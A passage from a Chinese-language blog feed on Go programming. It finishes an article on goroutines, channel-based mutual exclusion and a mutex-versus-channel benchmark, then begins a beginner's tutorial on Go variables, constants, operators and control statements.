class="type">int</span>)</span></span> &#123;</span><br><span class="line">    <span class="keyword">defer</span> wg.Done()</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line">        <span class="comment">// 用 channel 保护临界资源</span></span><br><span class="line">        temp := &lt;-countChan + add</span><br><span class="line">        runtime.Gosched() <span class="comment">// 当前 goroutine 从线程退出，并放回到队列</span></span><br><span class="line">        countChan &lt;- temp</span><br><span class="line">        fmt.Printf(<span class="string">&quot;add %d: %d\n&quot;</span>, add, temp)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    fmt.Println(<span class="string">&quot;init:&quot;</span>, count)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建通道，必须是有缓冲通道，无缓冲会导致死锁</span></span><br><span class="line">    countChan = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    wg.Add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">go</span> workWithChannel(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">go</span> workWithChannel(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将初始数据传入通道</span></span><br><span class="line">    countChan &lt;- count</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 等待 goroutine 结束</span></span><br><span class="line">    wg.Wait()</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将最终数据取出</span></span><br><span class="line">    count = &lt;-countChan</span><br><span class="line">    fmt.Println(<span class="string">&quot;result:&quot;</span>, count)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行也是可以得到正确结果 30。</p>
<p>用通道实现互斥的思路是：由于<strong>互斥是同步的一种特殊情况</strong>，那么我们可以将临界资源放入通道中，当一个 goroutine 从通道中取出资源使用时，下一个 goroutine 必须等待当前 goroutine 使用完资源放回通道后，才可以使用，这就相当于一种同步。</p>
<h4 id="8-1-4-用通道实现互斥性能并不佳"><a href="#8-1-4-用通道实现互斥性能并不佳" class="headerlink" title="8.1.4. 用通道实现互斥性能并不佳"></a>8.1.4. 用通道实现互斥性能并不佳</h4><p>虽然在 Go 语言中，可以使用通道实现互斥，但是使用通道方式的性能并不佳，请看如下示例。</p>
<p>我们定义两个分别使用锁和通道实现互斥的简单函数：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// channel.go</span></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;sync&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> count <span class="type">int</span></span><br><span class="line"><span class="keyword">var</span> countChan <span class="keyword">chan</span> <span class="type">int</span></span><br><span class="line"><span class="keyword">var</span> mutex sync.Mutex</span><br><span class="line"></span><br><span class="line"><span class="comment">// workWithMutex 对 count 全局变量进行读写操作，使用 mutex 互斥锁保护临界资源</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">workWithMutex</span><span class="params">(add <span class="type">int</span>)</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line">        <span class="comment">// 用互斥锁保护临界区</span></span><br><span class="line">        mutex.Lock()</span><br><span class="line">        temp := count + add</span><br><span class="line">        count = temp</span><br><span class="line">        mutex.Unlock() <span class="comment">// 释放锁</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// workWithChannel 对 count 全局变量进行读写操作，使用 channel 保护临界资源</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">workWithChannel</span><span class="params">(add <span class="type">int</span>)</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line">        <span class="comment">// 用 channel 保护临界资源</span></span><br><span class="line">        temp := &lt;-countChan + add</span><br><span class="line">        countChan &lt;- temp</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后，我们定义两个性能测试函数（Go语言自带性能测试，测试函数需要以 <code>Benchmark</code> 开头），分别测试 <code>workWithMutex</code> 和 <code>workWithChannel</code>：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//channel_test.go</span></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;testing&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">BenchmarkWorkWithMutex</span><span class="params">(b *testing.B)</span></span> &#123;</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; b.N; i++ &#123;</span><br><span class="line">        workWithMutex(<span class="number">1</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">BenchmarkWorkWithChannel</span><span class="params">(b *testing.B)</span></span> &#123;</span><br><span class="line">    countChan = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>, <span class="number">1</span>)</span><br><span class="line">    countChan &lt;- <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; b.N; i++ &#123;</span><br><span class="line">        workWithChannel(<span class="number">1</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    &lt;-countChan</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用 Go 自带的性能测试工具进行测试，结果如下：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">D:\<span class="title">my_code</span>\<span class="title">go</span>\<span class="title">src</span>\<span class="title">study</span>\<span class="title">goroutine_test</span>\<span class="title">channel_mutex_cmp</span>&gt;<span class="title">go</span> <span class="title">test</span> -<span class="title">bench</span> .</span></span><br><span class="line"><span class="function"><span class="title">goos</span>: <span class="title">windows</span></span></span><br><span class="line"><span class="function"><span class="title">goarch</span>: <span class="title">amd64</span></span></span><br><span class="line"><span class="function"><span class="title">pkg</span>: <span class="title">goroutine_test</span>/<span class="title">channel_mutex_cmp</span></span></span><br><span class="line"><span class="function"><span class="title">BenchmarkWorkWithChannel</span>-8       2264170               543 <span class="title">ns</span>/<span class="title">op</span></span></span><br><span class="line"><span class="function"><span class="title">BenchmarkWorkWithMutex</span>-8         8005128               141 <span class="title">ns</span>/<span class="title">op</span></span></span><br><span class="line"><span class="function"><span class="title">PASS</span></span></span><br><span class="line"><span class="function"><span class="title">ok</span>      <span class="title">goroutine_test</span>/<span class="title">channel_mutex_cmp</span>        4.166<span class="title">s</span></span></span><br></pre></td></tr></table></figure>

<p>可以看出：<strong>使用锁的性能比使用通道的性能高 2~3 倍</strong>。</p>
<p>其中原因，我猜测是：通道的本质跟锁的本质是一样的，都是原子操作 + goroutine 的阻塞唤醒，但锁的实现更加简单，而通道的实现较为复杂。所以，<strong>在实现互斥中，使用通道不如直接使用锁</strong>。</p>
<p>既然通道性能不如锁，那 Go 语言为何要提出通道呢？因为，Go 语言中，通道主要用于更方便地解决 goroutine 之间的同步通信问题，也就是同步问题中经典的<strong>生产者消费者问题</strong>，而不是互斥问题。</p>
<h3 id="8-2-同步通信"><a href="#8-2-同步通信" class="headerlink" title="8.2. 同步通信"></a>8.2. 同步通信</h3><p>生产者消费者问题是并发同步中的经典问题。</p>
<p>在学习操作系统过程中，我们知道生产者消费者问题可以用信号量PV解决，但过程相对复杂，既要检测资源数以实现同步，又要实现互斥。在 C 语言中，我们可以用 互斥锁+条件变量 的方式解决。</p>
<p>而在 Go 语言中，可以用通道轻松实现，如下就是一个生产者消费者的例子：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;math/rand&quot;</span></span><br><span class="line">    <span class="string">&quot;sync&quot;</span></span><br><span class="line">    <span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 缓冲区</span></span><br><span class="line"><span class="keyword">var</span> productChan <span class="keyword">chan</span> <span class="type">int</span></span><br><span class="line"><span class="keyword">var</span> wg sync.WaitGroup</span><br><span class="line"></span><br><span class="line"><span class="comment">// 生产者</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">produce</span><span class="params">()</span></span> &#123;</span><br><span class="line">    rand.Seed(time.Now().Unix())</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line">        product := rand.Intn(<span class="number">10</span>)</span><br><span class="line">        productChan &lt;- product</span><br><span class="line">        fmt.Printf(<span class="string">&quot;produce: %d\n&quot;</span>, product)</span><br><span class="line">    &#125;</span><br><span class="line">    wg.Done()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 消费者</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">consume</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line">        product := &lt;-productChan</span><br><span class="line">        fmt.Printf(<span class="string">&quot;consume: %d\n&quot;</span>, product)</span><br><span class="line">    &#125;</span><br><span class="line">    wg.Done()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    productChan = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>, <span class="number">3</span>)</span><br><span class="line">    wg.Add(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">go</span> produce()</span><br><span class="line">    <span class="keyword">go</span> consume()</span><br><span class="line">    wg.Wait()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="9-总结"><a href="#9-总结" class="headerlink" title="9. 总结"></a>9. 总结</h2><p>极其简单的 goroutine 线程创建运行，而通道又大大简化了 goroutine 线程间的通信，再加上 goroutine 高性能的调度模型。这样的并发编程，谁不喜欢呢？</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li>《Go语言实战》</li>
<li><a href="https://mp.weixin.qq.com/s/enjlUh9ldfpLUdU1VQFkRA">鹅厂工程师告诉你 Go 为什么这么“快”</a></li>
<li><a href="https://studygolang.com/articles/22390">【深度知识】GO语言的goroutine并发原理和调度机制</a></li>
</ul>
]]></content>
      <categories>
        <category>九层之台，起于累土</category>
        <category>程序设计语言</category>
      </categories>
      <tags>
        <tag>计算机系统</tag>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title>go语言入门</title>
    <url>/go%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>因项目需要和个人喜好，决定系统入门go语言。</p>
<p>go是由Google开发、开源、强类型的编译型语言。与c语言类似，不同的是，go中每行语句结束不用加 <code>;</code> :-)</p>
<p>本笔记主要参考 <strong>《Go语言实战》</strong> 。</p>
<p><strong>后加</strong>：本文所基于的GO语言版本较低（1.10），当时还并未支持 <code>Go Modules</code>。</p>
<span id="more"></span>

<h2 id="一、Hello-world"><a href="#一、Hello-world" class="headerlink" title="一、Hello world"></a>一、Hello world</h2><p>编写<code>hello.go</code>文件：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main    <span class="comment">// 程序入口包</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 程序入口函数</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;Hello world&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在命令行中输入：<code>go run hello.go</code></p>
<h2 id="二、基础语言"><a href="#二、基础语言" class="headerlink" title="二、基础语言"></a>二、基础语言</h2><h3 id="1-变量"><a href="#1-变量" class="headerlink" title="1. 变量"></a>1. 变量</h3><h4 id="1-1-基本变量类型"><a href="#1-1-基本变量类型" class="headerlink" title="1.1. 基本变量类型"></a>1.1. 基本变量类型</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 布尔型</span></span><br><span class="line"><span class="type">bool</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 字符串型</span></span><br><span class="line"><span class="type">string</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 整型</span></span><br><span class="line"><span class="type">int</span>  <span class="type">int8</span>  <span class="type">int16</span>  <span class="type">int32</span>  <span class="type">int64</span></span><br><span class="line"><span class="type">uint</span> <span class="type">uint8</span> <span class="type">uint16</span> <span class="type">uint32</span> <span class="type">uint64</span> <span class="type">uintptr</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// byte型</span></span><br><span class="line"><span class="type">byte</span> <span class="comment">// uint8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 表示一个 Unicode 码点</span></span><br><span class="line"><span class="type">rune</span> <span class="comment">// int32 的别名</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 浮点型</span></span><br><span class="line"><span class="type">float32</span> <span class="type">float64</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 复数型</span></span><br><span class="line"><span class="type">complex64</span> <span class="type">complex128</span></span><br></pre></td></tr></table></figure>

<h4 id="1-2-变量声明"><a href="#1-2-变量声明" class="headerlink" title="1.2. 变量声明"></a>1.2. 变量声明</h4><p><strong>特性</strong>：</p>
<ul>
<li>使用<code>var</code>关键字声明(像js)，变量类型在变量名后</li>
<li>短变量声明 (像python)</li>
<li>使用<code>()</code>一次声明多个变量</li>
<li>若声明的变量没被使用，会报错</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 一般声明</span></span><br><span class="line"><span class="keyword">var</span> v_name1 <span class="type">int</span></span><br><span class="line"><span class="keyword">var</span> v_name2 = <span class="number">1</span>     <span class="comment">// 根据值自行判别变量类型</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 短变量声明。不能用于声明全局变量</span></span><br><span class="line">v_name3 := <span class="string">&quot;hello&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 多变量声明</span></span><br><span class="line"><span class="keyword">var</span> vname1, vname2, vname3 <span class="type">int</span></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">    ToBe   <span class="type">bool</span>       = <span class="literal">false</span></span><br><span class="line">    MaxInt <span class="type">uint64</span>     = <span class="number">1</span>&lt;&lt;<span class="number">64</span> - <span class="number">1</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 指针变量声明</span></span><br><span class="line"><span class="keyword">var</span> p *<span class="type">int</span></span><br><span class="line">v_p := &amp;v_name1</span><br><span class="line">*v_p = <span class="number">233</span></span><br></pre></td></tr></table></figure>

<p><strong>注</strong>：和<code>c</code>类似，go也分 全局变量(函数外、包内) 和 局部变量(函数内&#x2F;控制语句内)</p>
<h4 id="1-3-变量零值"><a href="#1-3-变量零值" class="headerlink" title="1.3. 变量零值"></a>1.3. 变量零值</h4><p>变量声明时没有赋予初始值，则默认被赋予<strong>零值</strong>。</p>
<ul>
<li>布尔型零值：<code>false</code></li>
<li>字符串型零值：<code>&quot;&quot;</code></li>
<li>数值型零值：<code>0</code></li>
<li>指针型零值：<code>nil</code></li>
</ul>
<h4 id="1-4-强制类型转换"><a href="#1-4-强制类型转换" class="headerlink" title="1.4. 强制类型转换"></a>1.4. 强制类型转换</h4><p>表达式<code>T(v)</code>将值<code>v</code>转换为类型<code>T</code>。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> i <span class="type">int</span> = <span class="number">42</span></span><br><span class="line"><span class="keyword">var</span> f <span class="type">float64</span> = <span class="type">float64</span>(i)</span><br><span class="line"><span class="keyword">var</span> u <span class="type">uint</span> = <span class="type">uint</span>(f)</span><br></pre></td></tr></table></figure>

<h4 id="1-5-类型推导"><a href="#1-5-类型推导" class="headerlink" title="1.5. 类型推导"></a>1.5. 类型推导</h4><p>当不指定数据类型时，系统会自行推导变量类型。如下：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> i <span class="type">int</span></span><br><span class="line">j := i <span class="comment">// j 也是一个 int</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始值为常量，则取决于常量的精度</span></span><br><span class="line">i := <span class="number">42</span>           <span class="comment">// int</span></span><br><span class="line">f := <span class="number">3.142</span>        <span class="comment">// float64</span></span><br><span class="line">g := <span class="number">0.867</span> + <span class="number">0.5i</span> <span class="comment">// complex128</span></span><br></pre></td></tr></table></figure>

<h4 id="1-6-变量输出"><a href="#1-6-变量输出" class="headerlink" title="1.6. 变量输出"></a>1.6. 变量输出</h4><p>使用<code>fmt</code>包中的函数：<code>fmt.Printf</code>和<code>fmt.Println</code>。</p>
<p>格式化输出<code>fmt.Printf</code> &#x3D;&#x3D; c语言中的<code>printf</code>。<code>%T</code>输出数据的类型，<code>%v</code>输出任意数据的值，<code>%p</code>输出地址数据，<code>%d</code>输出整型数据，等等。</p>
<p>直接输出<code>fmt.Println</code> &#x3D;&#x3D; python中的<code>print</code>。</p>
<h3 id="2-常量"><a href="#2-常量" class="headerlink" title="2. 常量"></a>2. 常量</h3><p>用<code>const</code>关键字常量。可以不指定常量的数据类型。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> b <span class="type">string</span> = <span class="string">&quot;abc&quot;</span></span><br><span class="line"><span class="keyword">const</span> b = <span class="string">&quot;abc&quot;</span></span><br><span class="line"><span class="keyword">const</span> Pi = <span class="number">3.14</span></span><br></pre></td></tr></table></figure>

<h3 id="3-运算符"><a href="#3-运算符" class="headerlink" title="3. 运算符"></a>3. 运算符</h3><p>运算符与<code>c</code>语言类似。具体如下，优先级从高到低：</p>
<table>
<thead>
<tr>
<th>分类</th>
<th>描述</th>
<th>关联性</th>
</tr>
</thead>
<tbody><tr>
<td>后缀</td>
<td><code>()</code> <code>[]</code> <code>-&gt;</code> <code>.</code> <code>++</code> <code>--</code></td>
<td>左到右</td>
</tr>
<tr>
<td>一元</td>
<td><code>+</code> <code>-</code> <code>!</code> <code>~</code> <code>(type)</code> <code>*</code> <code>&amp;</code> <code>sizeof()</code></td>
<td>右到左</td>
</tr>
<tr>
<td>乘法</td>
<td><code>*</code> <code>/</code> <code>%</code></td>
<td>左到右</td>
</tr>
<tr>
<td>加法</td>
<td><code>+</code> <code>-</code></td>
<td>左到右</td>
</tr>
<tr>
<td>移位</td>
<td><code>&lt;&lt;</code> <code>&gt;&gt;</code></td>
<td>左到右</td>
</tr>
<tr>
<td>关系</td>
<td><code>&lt;</code> <code>&lt;=</code> <code>&gt;</code> <code>&gt;=</code></td>
<td>左到右</td>
</tr>
<tr>
<td>相等</td>
<td><code>==</code> <code>!=</code></td>
<td>左到右</td>
</tr>
<tr>
<td>按位AND</td>
<td><code>&amp;</code></td>
<td>左到右</td>
</tr>
<tr>
<td>按位XOR</td>
<td><code>^</code></td>
<td>左到右</td>
</tr>
<tr>
<td>按位OR</td>
<td>&#96;</td>
<td>&#96;</td>
</tr>
<tr>
<td>逻辑AND</td>
<td><code>&amp;&amp;</code></td>
<td>左到右</td>
</tr>
<tr>
<td>逻辑OR</td>
<td>&#96;</td>
<td></td>
</tr>
<tr>
<td>条件</td>
<td><code>?:</code></td>
<td>右到左</td>
</tr>
<tr>
<td>分配</td>
<td><code>=</code> <code>+=</code> <code>-=</code> <code>*=</code> <code>/=</code> <code>%=</code> <code>&gt;&gt;=</code> <code>&lt;&lt;=</code> <code>&amp;=</code> <code>^=</code> &#96;</td>
<td>&#x3D;&#96;</td>
</tr>
<tr>
<td>逗号</td>
<td><code>,</code></td>
<td>左到右</td>
</tr>
</tbody></table>
<h3 id="4-语句"><a href="#4-语句" class="headerlink" title="4. 语句"></a>4. 语句</h3><p>go中<code>if</code>和<code>for</code>语句不需要加<code>()</code>；语句大括号<code>&#123;</code>不需要换行。</p>
<h4 id="4-1-if语句"><a href="#4-1-if语句" class="headerlink" title="4.1. if语句"></a>4.1. if语句</h4><p><strong>特性</strong>：</p>
<ul>
<li>可以初始化变量，仅在<code>if</code>语句中使用。</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// if...else...</span></span><br><span class="line"><span class="keyword">if</span> numA &lt; <span class="number">20</span> &#123;</span><br><span class="line">    fmt.Printf(<span class="string">&quot;a小于20\n&quot;</span> );</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    fmt.Printf(<span class="string">&quot;numA 不小于 20\n&quot;</span> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// if语句的分号前面，相当于初始化一个变量，仅在if语句内使用</span></span><br><span class="line"><span class="keyword">if</span> i := <span class="number">30</span>; numA &lt; i &#123;</span><br><span class="line">    fmt.Println(i)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="4-2-switch语句"><a href="#4-2-switch语句" class="headerlink" title="4.2. switch语句"></a>4.2. switch语句</h4><p><strong>特性</strong>：</p>
<ul>
<li>case语句结束自动break</li>
<li>case可以同时匹配多个值，如：<code>case v1,v2,v3:</code></li>
<li>匹配一个case成功后，可以使用<code>fallthrough</code>强制匹配下一个case</li>
<li><code>switch</code>可以没有条件</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> grade <span class="type">string</span></span><br><span class="line"><span class="keyword">var</span> marks <span class="type">int</span> = <span class="number">90</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// case语句结束自动break。</span></span><br><span class="line"><span class="comment">// 可以同时case多个值，case v1,v2,v3:</span></span><br><span class="line"><span class="keyword">switch</span> marks &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">90</span>: grade = <span class="string">&quot;A&quot;</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">80</span>: grade = <span class="string">&quot;B&quot;</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">50</span>,<span class="number">60</span>,<span class="number">70</span> : grade = <span class="string">&quot;C&quot;</span></span><br><span class="line">    <span class="keyword">default</span>: grade = <span class="string">&quot;D&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">fmt.Printf(<span class="string">&quot;你的等级是 %s\n&quot;</span>, grade );</span><br><span class="line"></span><br><span class="line">t := time.Now()</span><br><span class="line"><span class="keyword">switch</span> &#123;</span><br><span class="line">    <span class="keyword">case</span> t.Hour() &lt; <span class="number">12</span>:</span><br><span class="line">        fmt.Println(<span class="string">&quot;Good morning!&quot;</span>)</span><br><span class="line">    <span class="keyword">case</span> t.Hour() &lt; <span class="number">17</span>:</span><br><span class="line">        fmt.Println(<span class="string">&quot;Good afternoon.&quot;</span>)</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        fmt.Println(<span class="string">&quot;Good evening.&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="literal">false</span>:</span><br><span class="line">        fmt.Println(<span class="string">&quot;1、case 条件语句为 false&quot;</span>)</span><br><span class="line">        <span class="keyword">fallthrough</span></span><br><span class="line">    <span class="keyword">case</span> <span class="literal">true</span>:</span><br><span class="line">        fmt.Println(<span class="string">&quot;2、case 条件语句为 true&quot;</span>)</span><br><span class="line">        <span class="keyword">fallthrough</span></span><br><span class="line">    <span class="keyword">case</span> <span class="literal">false</span>:</span><br><span class="line">        fmt.Println(<span class="string">&quot;3、case 条件语句为 false&quot;</span>)</span><br><span class="line">        <span class="keyword">fallthrough</span></span><br><span class="line">    <span class="keyword">case</span> <span class="literal">true</span>:</span><br><span class="line">        fmt.Println(<span class="string">&quot;4、case 条件语句为 true&quot;</span>)</span><br><span class="line">    <span class="keyword">case</span> <span class="literal">false</span>:</span><br><span class="line">        fmt.Println(<span class="string">&quot;5、case 条件语句为 false&quot;</span>)</span><br><span class="line">        <span class="keyword">fallthrough</span></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        fmt.Println(<span class="string">&quot;6、默认 case&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">输出：</span></span><br><span class="line"><span class="comment">2、case 条件语句为 true</span></span><br><span class="line"><span class="comment">3、case 条件语句为 false</span></span><br><span class="line"><span class="comment">4、case 条件语句为 true</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<h4 id="4-3-select语句"><a href="#4-3-select语句" class="headerlink" title="4.3. select语句"></a>4.3. select语句</h4><p><code>select</code>语句类似于<code>switch</code>语句。</p>
<p>但是，区别在于：</p>
<ul>
<li>每个case必须是一个通信操作（数据结构<strong>通道</strong>的操作），要么是发送要么是接收。</li>
<li>select随机执行一个未堵塞的case。如果所有case都堵塞，它将等待，直到有case可以通行。</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> c1, c2, c3 <span class="keyword">chan</span> <span class="type">int</span></span><br><span class="line"><span class="keyword">var</span> i1, i2 <span class="type">int</span></span><br><span class="line"><span class="comment">// 随机执行一个case，若所有case都堵塞，则直到有case可以通行为止</span></span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line">    <span class="keyword">case</span> i1 = &lt;-c1:</span><br><span class="line">        fmt.Println(<span class="string">&quot;received &quot;</span>, i1, <span class="string">&quot; from c1&quot;</span>)</span><br><span class="line">    <span class="keyword">case</span> c2 &lt;- i2:</span><br><span class="line">        fmt.Println(<span class="string">&quot;sent &quot;</span>, i2, <span class="string">&quot; to c2&quot;</span>)</span><br><span class="line">    <span class="keyword">case</span> i3, ok := (&lt;-c3):  <span class="comment">// same as: i3, ok := &lt;-c3</span></span><br><span class="line">        <span class="keyword">if</span> ok &#123;</span><br><span class="line">            fmt.Println(<span class="string">&quot;received &quot;</span>, i3, <span class="string">&quot; from c3&quot;</span>)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            fmt.Println(<span class="string">&quot;c3 is closed&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        fmt.Println(<span class="string">&quot;no communication&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">输出：</span></span><br><span class="line"><span class="comment">no communication</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<h4 id="4-4-for语句"><a href="#4-4-for语句" class="headerlink" title="4.4. for语句"></a>4.4. for语句</h4><p><strong>特性</strong>：</p>
<ul>
<li><code>for</code>只带条件判断相当于<code>while</code></li>
<li><code>for</code>中使用<code>range</code>关键字，可以遍历顺序结构，返回<code>key</code>和<code>value</code></li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line">    fmt.Printf(<span class="string">&quot;i 的值为: %d\n&quot;</span>, i)</span><br><span class="line">    <span class="keyword">if</span> i &gt; <span class="number">5</span>&#123;</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 相当于c的while</span></span><br><span class="line"><span class="keyword">for</span> numA &lt; numB &#123;</span><br><span class="line">    numA++</span><br><span class="line">    fmt.Printf(<span class="string">&quot;numA 的值为: %d\n&quot;</span>, numA)</span><br><span class="line">&#125;</span><br><span class="line">numbers := [<span class="number">6</span>]<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>&#125;</span><br><span class="line"><span class="comment">// range关键字，可以对 slice、map、数组、字符串等进行迭代</span></span><br><span class="line"><span class="keyword">for</span> key, value := <span class="keyword">range</span> numbers &#123;</span><br><span class="line">    fmt.Printf(<span class="string">&quot;第 %d 位 x 的值 = %d\n&quot;</span>, key, value)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="5-函数-引用-数据类型"><a href="#5-函数-引用-数据类型" class="headerlink" title="5. 函数 引用-数据类型"></a>5. 函数 引用-数据类型</h3><p>go语言的一大“神奇”特点，就是喜欢把原本前面的东西放到后面，函数也不例外。</p>
<p><strong>特性</strong>：</p>
<ul>
<li>函数以关键字<code>func</code>进行声明</li>
<li>返回类型(和值)，放在参数项的后面</li>
<li>允许先声明返回值</li>
<li>多值返回</li>
<li><code>defer</code>。<code>defer</code>语句会将<strong>指定函数</strong>推迟到<strong>外层函数返回之后</strong>再执行。并且，被推迟的函数将被压入一个栈中。</li>
</ul>
